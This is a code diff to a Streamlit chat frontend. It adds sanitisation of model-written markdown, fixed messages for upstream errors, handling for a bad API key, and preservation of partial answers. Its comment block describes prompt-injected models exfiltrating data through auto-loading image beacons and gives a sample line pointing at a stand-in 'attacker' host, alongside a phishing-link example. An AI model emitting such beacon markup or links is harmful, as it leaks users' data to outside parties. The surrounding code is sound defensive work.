@@ -99,8 +99,10 @@
 #     ❌  Unexpected exceptions
 # ============================================================================
 
+import html
 import logging
 import os
+import re
 import time
 import uuid
 from typing import Dict, List, Optional
@@ -232,6 +234,161 @@ REASONING_EFFORT_OPTIONS: Dict[str, Optional[str]] = {
 
 
 # ============================================================================
+# MODEL OUTPUT SANITISATION
+# ============================================================================
+# Assistant content is upstream-controlled text rendered straight into
+# st.markdown. A prompt-injected (or compromised) model can therefore emit
+# markup that the browser will act on:
+#
+#   - Auto-loading image beacons:  ![](http://attacker/?t=secret)
+#     Streamlit renders markdown images as <img> tags the browser fetches
+#     immediately — a zero-click exfiltration / tracking channel.
+#   - Phishing links:  [click here](http://attacker/login)
+#     Rendered as a real anchor the user may click.
+#
+# We do NOT want to break legitimate formatting (code, lists, emphasis,
+# headings), so this is a targeted neutralisation rather than a full HTML/
+# markdown strip:
+#
+#   1. Image syntax  ![alt](url)  → rewritten to inert text "🖼️ alt (hxxp://url)"
+#      so Streamlit emits NO <img> and nothing auto-loads. The rewrite breaks
+#      the `](` adjacency so the link pass below cannot re-match it.
+#   2. Link syntax   [text](url)  → defanged to  text (hxxp://url)  so the URL
+#      is visible but not an auto-clickable anchor.
+#   3. Bare/autolinked URLs       → scheme defanged (http→hxxp) so Streamlit's
+#      autolinker does not turn them into live anchors.
+#
+# Applied to model output before EVERY st.markdown render (live streaming and
+# history replay). NOT applied to the user's own echoed input.
+
+# ![alt](url)  — capture alt text, drop the auto-loading image.
+_MD_IMAGE_RE = re.compile(r"!\[([^\]]*)\]\(([^)]*)\)")
+# [text](url)  — capture link text and target (image case already consumed).
+_MD_LINK_RE = re.compile(r"\[([^\]]*)\]\(([^)]*)\)")
+# Bare URLs (http/https) not already inside markdown link syntax.
+_RAW_URL_RE = re.compile(r"\bhttps?://", re.IGNORECASE)
+
+
+def _defang_scheme(match: "re.Match[str]") -> str:
+    """Rewrite an http(s):// scheme to the inert hxxp(s):// defanged form."""
+    return match.group(0).replace("tt", "xx", 1)
+
+
+def _defang_url(url: str) -> str:
+    """Neutralise a URL so the browser will not auto-load or linkify it."""
+    return _RAW_URL_RE.sub(_defang_scheme, url)
+
+
+def sanitize_model_markdown(text: str) -> str:
+    """
+    Neutralise dangerous markdown in upstream model output before rendering.
+
+    Strips/escapes auto-loading image beacons and defangs link/URL targets so
+    a prompt-injected model cannot exfiltrate data via image fetches or push a
+    clickable phishing link, while leaving legitimate formatting (code, lists,
+    emphasis, headings) intact.
+
+    Args:
+        text: Raw assistant/model content (may be a streaming partial).
+
+    Returns:
+        Sanitised markdown safe to pass to st.markdown.
+    """
+    if not text:
+        return text
+
+    # 1. Images → inert text. Show the alt + defanged URL so the user still
+    #    sees what the model tried to embed, but no <img> is emitted. The output
+    #    deliberately avoids the "](" markdown-link adjacency so the link pass
+    #    below does not re-process it. Escape the alt to neutralise any markup
+    #    hidden inside it.
+    def _image_repl(m: "re.Match[str]") -> str:
+        alt = html.escape(m.group(1)).strip()
+        url = _defang_url(m.group(2))
+        label = f"image: {alt}" if alt else "image"
+        return f"🖼️ {label} ({url})"
+
+    text = _MD_IMAGE_RE.sub(_image_repl, text)
+
+    # 2. Links → keep the visible text, defang the target so it is not a live
+    #    anchor. Rendered as:  text (hxxp://host/path)
+    def _link_repl(m: "re.Match[str]") -> str:
+        label = m.group(1)
+        url = _defang_url(m.group(2))
+        return f"{label} ({url})"
+
+    text = _MD_LINK_RE.sub(_link_repl, text)
+
+    # 3. Any remaining bare URLs — defang the scheme so Streamlit's autolinker
+    #    does not turn them into clickable anchors.
+    text = _RAW_URL_RE.sub(_defang_scheme, text)
+
+    return text
+
+
+# ============================================================================
+# IN-BAND ERROR MAPPING
+# ============================================================================
+# A mid-stream [ERROR ...] sentinel is upstream-controlled. sse_decoder parses
+# it into a trusted shape (an optional upstream_status int + a length-capped
+# fallback string) rather than handing us the raw payload to render. We map the
+# status to a FIXED, locally-authored message — never echoing upstream text as
+# the primary banner — using the same emoji taxonomy as the pre-stream HTTP
+# error path in stream_chat(). Only when no status was parsed do we fall back
+# to the short capped string, and even then it is clearly framed as upstream
+# detail.
+
+_UPSTREAM_STATUS_MESSAGES: Dict[int, str] = {
+    400: "⚠️ The upstream model rejected the request (400) mid-stream.",
+    401: "🔐 Upstream auth failed (401) mid-stream.",
+    422: "⚠️ The upstream model rejected the request (422) mid-stream.",
+    500: "❌ The upstream model hit an internal error (500) mid-stream.",
+    502: "🔌 openagent-api lost the connection to the upstream model (502) "
+         "mid-stream.",
+    503: "⏳ The upstream model became unavailable (503) mid-stream — it may "
+         "be loading. Please try again.",
+    504: "⏳ The upstream model timed out (504) mid-stream. Please try again.",
+}
+
+
+def map_inband_error(event: "SSEEvent") -> str:
+    """
+    Map a structured KIND_ERROR SSEEvent to a fixed, user-facing message.
+
+    Never renders the raw upstream payload as the primary banner. Synthetic
+    error events produced by stream_chat() (connection drops, read timeouts)
+    already carry a trusted, emoji-prefixed message and no parsed status, so
+    those pass through unchanged. In-band [ERROR upstream_status=NNN] sentinels
+    are mapped to a locally-authored message keyed on the parsed status.
+
+    Args:
+        event: An SSEEvent with kind == "error".
+
+    Returns:
+        A safe, user-facing error string.
+    """
+    status = getattr(event, "error_status", None)
+
+    if status is not None:
+        mapped = _UPSTREAM_STATUS_MESSAGES.get(status)
+        if mapped:
+            return mapped
+        return (
+            f"❌ The upstream model failed mid-stream "
+            f"(status {status}). Please try again."
+        )
+
+    # No parsed status. If the decoder gave us a capped fallback string, it is
+    # either a trusted stream_chat() message (already emoji-prefixed) or a
+    # short, length-bounded scrap of an unrecognised in-band sentinel. Use it
+    # if present, otherwise a generic fixed message.
+    detail = (event.error or "").strip()
+    if detail:
+        return detail
+    return "❌ The upstream model failed mid-stream. Please try again."
+
+
+# ============================================================================
 # SESSION STATE INITIALISATION
 # ============================================================================
 
@@ -312,14 +469,15 @@ def check_health() -> Optional[str]:
     needs to recognise three values.
 
     The /health endpoint is authenticated — same X-API-Key as /chat. A 401
-    from this endpoint means openagent-api is up but the key is wrong; we
-    surface that as None (treated like a connection failure for gate purposes)
-    and let the user fix the key and retry.
+    from this endpoint means openagent-api is UP but the key is wrong. That is
+    a distinct condition from "backend down", so we return the sentinel string
+    "unauthorized" (not None) and let the gate render a key-specific message.
+    None is reserved for genuine connectivity/parse failures.
 
     Returns:
         The top-level status string ("ok" / "loading" / "unreachable" /
-        other) on success, or None on connection error / non-200 / parse
-        failure / auth failure.
+        other) on success, the literal "unauthorized" on HTTP 401, or None on
+        connection error / other non-200 / parse failure.
     """
     try:
         response = requests.get(
@@ -333,7 +491,9 @@ def check_health() -> Optional[str]:
             logger.error(
                 "/health returned 401 — OPENAGENT_API_KEY is missing or wrong"
             )
-            return None
+            # Distinct from "backend down": the gateway answered, it just
+            # rejected the key. Surfaced as a 🔐 branch in the gate.
+            return "unauthorized"
         logger.warning(
             f"/health returned unexpected status {response.status_code}"
         )
@@ -511,6 +671,19 @@ def stream_chat(
         # one consistent error path. Caller will st.error() it and break out
         # of the loop.
         yield SSEEvent(kind=KIND_ERROR, error=f"🔌 {msg}")
+    except requests.exceptions.ReadTimeout:
+        # The read timeout is the gap allowed BETWEEN streamed bytes. Hitting
+        # it mid-stream means the connection stalled — no data for
+        # STREAM_READ_TIMEOUT_SECONDS — rather than an "unexpected" error. Label
+        # it as a stall with the ⏳ taxonomy so the user understands it is a
+        # timeout, not a crash, and can retry.
+        msg = (
+            f"Stream stalled — no data from openagent-api for "
+            f"{STREAM_READ_TIMEOUT_SECONDS:g}s. The upstream model may be "
+            f"overloaded or stuck. Please try again."
+        )
+        logger.error(msg)
+        yield SSEEvent(kind=KIND_ERROR, error=f"⏳ {msg}")
     except Exception as err:
         msg = f"Error reading SSE stream: {err}"
         logger.exception(msg)
@@ -555,6 +728,15 @@ if not st.session_state.model_ready:
     attempt = 0
     capped = MAX_HEALTH_POLL_ATTEMPTS > 0
 
+    # If we got here via a Retry click (the button below sets this on its
+    # rerun), give immediate visible feedback BEFORE the first check_health()
+    # call — that call can block for up to HEALTH_TIMEOUT_SECONDS, and without
+    # this the click would feel like it did nothing. Cleared once polling
+    # produces its own status.
+    if st.session_state.pop("health_retry_requested", False):
+        status_box.info("🔄 Retrying… re-checking openagent-api.")
+        logger.info("Health gate retry requested by user")
+
     while not st.session_state.model_ready:
         attempt += 1
         health_status = check_health()
@@ -581,6 +763,21 @@ if not st.session_state.model_ready:
                 f"Retrying every {HEALTH_POLL_INTERVAL_SECONDS}s. "
                 f"(Attempt #{attempt})"
             )
+
+        elif health_status == "unauthorized":
+            # openagent-api is reachable but rejected our X-API-Key (HTTP 401).
+            # This is a configuration error, not a connectivity or cold-start
+            # one — retrying on the same wrong key will never clear, so stop
+            # polling immediately and tell the user exactly what to fix.
+            status_box.error(
+                f"🔐 openagent-api is reachable but rejected the key "
+                f"(HTTP 401). Fix OPENAGENT_API_KEY in openagent-frontend's "
+                f".env so it matches OPENAGENT_API_KEY in openagent-api's .env "
+                f"exactly, then retry."
+            )
+            st.session_state.health_retry_requested = True
+            st.button("🔄 Retry connection", key="retry_health")
+            st.stop()
 
         elif health_status is None:
             status_box.error(
@@ -609,7 +806,12 @@ if not st.session_state.model_ready:
                 f"openagent-api and openagent-infra are running and that "
                 f"OPENAGENT_API_KEY matches between the services."
             )
-            st.button("🔄 Retry connection")  # any click reruns the script
+            # Prime the retry feedback so the NEXT run (triggered by the click)
+            # shows an immediate "Retrying…" status before the first
+            # check_health() — which can block for up to HEALTH_TIMEOUT_SECONDS
+            # — rather than re-blocking silently for a whole cap cycle.
+            st.session_state.health_retry_requested = True
+            st.button("🔄 Retry connection", key="retry_health")
             st.stop()
 
         time.sleep(HEALTH_POLL_INTERVAL_SECONDS)
@@ -628,7 +830,13 @@ if not st.session_state.model_ready:
 
 for message in st.session_state.messages:
     with st.chat_message(message["role"]):
-        st.markdown(message["content"])
+        # Sanitise model output (image beacons / phishing links) on replay.
+        # The user's own echoed turn is rendered as-is, matching today's
+        # behaviour.
+        if message["role"] == "assistant":
+            st.markdown(sanitize_model_markdown(message["content"]))
+        else:
+            st.markdown(message["content"])
 
 
 # ============================================================================
@@ -737,11 +945,15 @@ if prompt := st.chat_input("Message OpenAgent..."):
 
                 if event.kind == KIND_REASONING:
                     reasoning_text += event.text
-                    thinking_placeholder.markdown(reasoning_text + " ▌")
+                    thinking_placeholder.markdown(
+                        sanitize_model_markdown(reasoning_text) + " ▌"
+                    )
 
                 elif event.kind == KIND_CONTENT:
                     answer_text += event.text
-                    answer_placeholder.markdown(answer_text + " ▌")
+                    answer_placeholder.markdown(
+                        sanitize_model_markdown(answer_text) + " ▌"
+                    )
 
                 elif event.kind == KIND_FINISH:
                     # Generation finished cleanly — record the reason for the
@@ -752,9 +964,11 @@ if prompt := st.chat_input("Message OpenAgent..."):
                 elif event.kind == KIND_ERROR:
                     # In-band error from openagent-api (mid-stream upstream
                     # failure) or a synthetic error event from stream_chat() on
-                    # a connection drop. Either way, display it and stop
+                    # a connection drop / read-timeout. map_inband_error()
+                    # turns the structured event into a fixed, trusted message
+                    # (never echoing raw upstream payload). Display it and stop
                     # consuming.
-                    error_msg = event.error
+                    error_msg = map_inband_error(event)
                     break
 
                 elif event.kind == KIND_DONE:
@@ -775,13 +989,13 @@ if prompt := st.chat_input("Message OpenAgent..."):
         # each independently.
 
         if reasoning_text:
-            thinking_placeholder.markdown(reasoning_text)
+            thinking_placeholder.markdown(sanitize_model_markdown(reasoning_text))
         # If reasoning was empty, leave the expander as-is — Streamlit renders
         # an empty expander gracefully and it gives the user a consistent UI
         # shape across turns.
 
         if answer_text:
-            answer_placeholder.markdown(answer_text)
+            answer_placeholder.markdown(sanitize_model_markdown(answer_text))
         elif not error_msg:
             # Stream ended cleanly but produced no answer content. Rare but
             # possible — show a neutral marker so the bubble is not blank or
@@ -792,13 +1006,35 @@ if prompt := st.chat_input("Message OpenAgent..."):
 
         if error_msg:
             st.error(error_msg)
-            # Do NOT append to history — keep state clean so the user can
-            # retry without a phantom half-answer in the transcript.
+            # A mid-stream error after content already streamed used to discard
+            # the partial answer on the next rerun (it was never appended to
+            # history). Keep what the user already saw: if we have partial
+            # answer text, persist it with an "interrupted" marker so it
+            # survives the rerun instead of vanishing. With no partial answer
+            # we keep state clean so the user can simply retry.
+            if answer_text:
+                st.session_state.messages.append({
+                    "role":    "assistant",
+                    "content": answer_text + "\n\n_(response interrupted)_",
+                })
+                logger.info(
+                    f"Partial response preserved after mid-stream error "
+                    f"| Session: {st.session_state.session_id} "
+                    f"| Answer chars: {len(answer_text)}"
+                )
         else:
             st.session_state.messages.append({
                 "role":    "assistant",
                 "content": answer_text,
             })
+
+            # Surface a truncated generation. finish_reason == "length" means
+            # the model hit the token limit before finishing, so the answer is
+            # cut off — tell the user rather than letting them assume it is
+            # complete.
+            if finish_reason == "length":
+                st.caption("⚠️ Response truncated — token limit reached.")
+
             logger.info(
                 f"Response complete "
                 f"| Session: {st.session_state.session_id} "
